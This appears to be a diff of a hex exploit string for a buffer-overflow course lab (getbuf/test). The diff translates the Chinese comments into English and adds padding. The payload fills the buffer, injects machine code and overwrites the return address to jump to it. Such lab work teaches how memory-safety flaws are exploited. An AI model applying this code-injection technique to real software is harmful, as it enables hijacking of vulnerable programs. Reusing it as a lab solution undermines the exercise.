@@ -1,12 +1,13 @@
-/* 填充getbuf()的缓冲区 */
+/* Fill getbuf()'s buffer */
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-/* 以下为注入的代码 */
+00 00 00 00 00 00 00 00
+/* Injected code starts here */
 48 c7 c7 92 38 f1 4d 68
 60 89 80 00 c3 00 00 00
-/* 将返回地址覆盖为注入代码的地址 */
+/* Overwrite the return address with the injected code's address */
 e0 90 64 55 00 00 00 00
-/* 0x556490f0 为栈中存储返回test地址的位置 */
+/* 0x556490f0 is where the return address to test() is stored on the stack */
